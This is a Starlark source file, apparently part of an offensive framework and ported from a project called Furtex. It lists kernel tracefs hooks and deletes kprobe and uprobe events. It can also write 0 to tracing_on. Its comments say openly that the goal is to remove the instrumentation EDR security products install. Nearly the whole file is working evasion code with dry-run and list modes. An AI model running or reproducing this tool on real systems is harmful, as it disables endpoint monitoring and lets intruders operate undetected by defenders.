# kprobe_clear - list and clear kernel trace hooks via tracefs.
#
# Ported to Starlark from Furtex's edrs/ftrace_enum.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# Clearing kprobe_events/uprobe_events is how an EDR's instrumentation installed
# through tracefs is removed. LKM-provided ftrace hooks (visible in
# enabled_functions) cannot be unregistered from userspace; unloading the module
# is required (see lkm_unload).
#
# `tracefs` overrides the auto-detected root so the parse logic can be tested
# without a mounted, writable tracefs.

AT_FDCWD = -100
O_WRONLY = 1
O_APPEND = 1024

TRACEFS_CANDIDATES = ["/sys/kernel/tracing", "/sys/kernel/debug/tracing"]

LIST_FILES = [
    "kprobe_events",
    "uprobe_events",
    "set_ftrace_filter",
    "enabled_functions",
    "tracing_on",
]


def _is_true(s):
    return str_lower(s) in ("true", "1", "yes", "on")


def _find_tracefs(override):
    if override:
        return override
    for p in TRACEFS_CANDIDATES:
        if exists(p + "/kprobe_events") or exists(p + "/tracing_on"):
            return p
    return ""


def _append(path, data):
    # Tracefs control files are append-only event logs; never route this through
    # write_file, which encrypts disk writes.
    res = sys_call("openat", AT_FDCWD, path, O_WRONLY | O_APPEND, 0)
    if res["errno"] != 0:
        return res["errno"]
    fd = res["r1"]
    w = sys_call("write", fd, data, len(data))
    sys_call("close", fd)
    return w["errno"]


def _write_ctl(path, data):
    res = sys_call("openat", AT_FDCWD, path, O_WRONLY, 0)
    if res["errno"] != 0:
        return res["errno"]
    fd = res["r1"]
    w = sys_call("write", fd, data, len(data))
    sys_call("close", fd)
    return w["errno"]


def _event_id(line):
    # "p:kprobes/foo do_sys_open ..." -> "kprobes/foo"
    # "p:foo do_sys_open ..."         -> "foo"
    fields = line.split()
    if not fields:
        return ""
    head = fields[0]
    idx = str_index(head, ":")
    if idx < 0:
        return head
    return head[idx + 1:]


def _remove_events(path, label, dry_run):
    data = read_file(path, default="")
    if not data:
        print("  [*] %s: empty or not readable" % label)
        return 0
    count = 0
    for line in data.splitlines():
        line = line.strip()
        if not line:
            continue
        eid = _event_id(line)
        if not eid:
            continue
        cmd = "-:%s\n" % eid
        if dry_run:
            print("  [dry-run] %s -> %s" % (line, cmd.strip()))
        else:
            errno = _append(path, cmd)
            if errno != 0:
                print("  [!] removing %s failed (errno=%d)" % (eid, errno))
            else:
                print("  [+] removed %s" % eid)
        count += 1
    return count


def _list(root):
    for name in LIST_FILES:
        path = root + "/" + name
        data = read_file(path, default="")
        print("=== %s (%s) ===" % (name, path))
        if not data:
            print("  (empty or unreadable)")
            continue
        for line in data.splitlines():
            if line.strip():
                print("  %s" % line)


def main(*args):
    action = "list"
    tracefs = ""
    dry_run = False
    if args and args[0]:
        action = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        tracefs = args[1].strip()
    if len(args) > 2 and args[2]:
        dry_run = _is_true(args[2])

    root = _find_tracefs(tracefs)
    if not root:
        print("[!] tracefs not found; mount it or pass --tracefs")
        return "ERROR: tracefs not found"

    if action == "list":
        _list(root)
        return "OK"
    if action == "clear-kprobes":
        n = _remove_events(root + "/kprobe_events", "kprobe_events", dry_run)
        print("[*] %d kprobe event(s) %s" % (n, "would be removed" if dry_run else "processed"))
        return "OK"
    if action == "clear-uprobes":
        n = _remove_events(root + "/uprobe_events", "uprobe_events", dry_run)
        print("[*] %d uprobe event(s) %s" % (n, "would be removed" if dry_run else "processed"))
        return "OK"
    if action == "tracing-off":
        errno = _write_ctl(root + "/tracing_on", "0")
        if errno != 0:
            print("[!] tracing_on write failed (errno=%d)" % errno)
            return "ERROR: errno=%d" % errno
        print("[+] tracing disabled (tracing_on=0)")
        return "OK"
    print("[!] unknown action: %s" % action)
    return "ERROR: unknown action"
